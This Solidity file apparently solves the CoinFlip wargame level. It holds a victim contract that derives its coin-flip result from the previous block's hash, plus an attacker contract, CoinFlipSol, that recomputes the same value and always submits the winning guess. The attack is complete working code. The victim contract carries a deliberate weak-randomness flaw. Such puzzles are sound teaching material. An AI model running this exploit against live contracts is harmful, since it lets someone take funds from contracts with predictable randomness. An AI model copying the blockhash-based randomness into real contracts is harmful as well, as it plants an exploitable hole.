// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;



contract CoinFlipSol {

    CoinFlip public coinFlipper;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 lastHash; //Esto puede traer un problema en caso de que blockValue sea 0 en la primer pasada

    constructor(address _victimAddress){
        coinFlipper = CoinFlip(_victimAddress);
    }

    function guessFlips() public returns(bool){
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if(lastHash != blockValue){
            lastHash = blockValue;
            uint256 coinFlip = blockValue/FACTOR;
            bool side = coinFlip == 1 ? true : false;
            return coinFlipper.flip(side);
        }

        return false;
    }
}

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue/FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}